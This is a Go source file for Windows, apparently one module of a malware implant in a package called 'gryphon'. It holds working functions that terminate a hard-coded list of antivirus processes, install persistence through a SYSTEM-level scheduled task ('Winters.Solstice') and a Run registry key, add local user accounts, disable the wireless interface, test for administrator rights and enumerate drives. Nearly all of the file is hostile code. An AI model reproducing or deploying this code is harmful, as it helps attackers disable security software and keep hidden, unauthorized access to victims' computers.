//go:build windows
// +build windows

package gryphon

import (
	"fmt"
	"log"
	"os"

	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func killProcByPID(pid int) error {
	kernel32dll := windows.NewLazyDLL("Kernel32.dll")
	OpenProcess := kernel32dll.NewProc("OpenProcess")
	TerminateProcess := kernel32dll.NewProc("TerminateProcess")
	op, _, _ := OpenProcess.Call(0x0001, 1, uintptr(pid))
	//protip:too much error handling can screw things up
	_, _, err2 := TerminateProcess.Call(op, 9)
	return err2
}

func isRoot() bool {
	root := true

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		root = false
	}

	return root
}

func info() string {
	user, err := cmdOut("query user")
	if err != nil {
		user = "N/A"
	}

	// o, err := cmdOut("ipconfig")
	// if err != nil {
	// 	ap_ip = "N/A" // (1)
	// }

	// entries := strings.Split(o, "\n")

	// for e := range entries {
	// 	entry := entries[e]
	// 	if strings.Contains(entry, "Default") {
	// 		ap_ip = strings.Split(entry, ":")[1] // (1)
	// 	}
	// }

	return user
}

func pkillAv() error {
	av_processes := []string{
		"advchk.exe", "ahnsd.exe", "alertsvc.exe", "alunotify.exe", "autodown.exe", "avmaisrv.exe",
		"avpcc.exe", "avpm.exe", "avsched32.exe", "avwupsrv.exe", "bdmcon.exe", "bdnagent.exe", "bdoesrv.exe",
		"bdss.exe", "bdswitch.exe", "bitdefender_p2p_startup.exe", "cavrid.exe", "cavtray.exe", "cmgrdian.exe",
		"doscan.exe", "dvpapi.exe", "frameworkservice.exe", "frameworkservic.exe", "freshclam.exe", "icepack.exe",
		"isafe.exe", "mgavrtcl.exe", "mghtml.exe", "mgui.exe", "navapsvc.exe", "nod32krn.exe", "nod32kui.exe",
		"npfmntor.exe", "nsmdtr.exe", "ntrtscan.exe", "ofcdog.exe", "patch.exe", "pav.exe", "pcscan.exe",
		"poproxy.exe", "prevsrv.exe", "realmon.exe", "savscan.exe", "sbserv.exe", "scan32.exe", "spider.exe",
		"tmproxy.exe", "trayicos.exe", "updaterui.exe", "updtnv28.exe", "vet32.exe", "vetmsg.exe", "vptray.exe",
		"vsserv.exe", "webproxy.exe", "webscanx.exe", "xcommsvr.exe"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func wifiDisconnect() error {
	cmd := `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func schtaskPersistence() error {
	cmd, er := GetPath()
	if er != nil {
		log.Println(er)
	}
	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "Winters.Solstice" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	return err
}

func startUpPersistence() error {
	path, er := GetName()
	if er != nil {
		log.Println(er)
	}
	err := WriteRegistryKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "solstice", path)
	return err
}

func addPersistentCommand(persistenceType string) error {
	var err error
	if persistenceType == "Schtasks" {
		err = schtaskPersistence()
	} else if persistenceType == "Startup" {
		err = startUpPersistence()
	}
	return err
}

func createUser(username, password string) error {
	cmd := f("net user %s %s /ADD", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			found_drives = append(found_drives, string(drive)+":\\")
			f.Close()
		}
	}
	return found_drives, nil
}
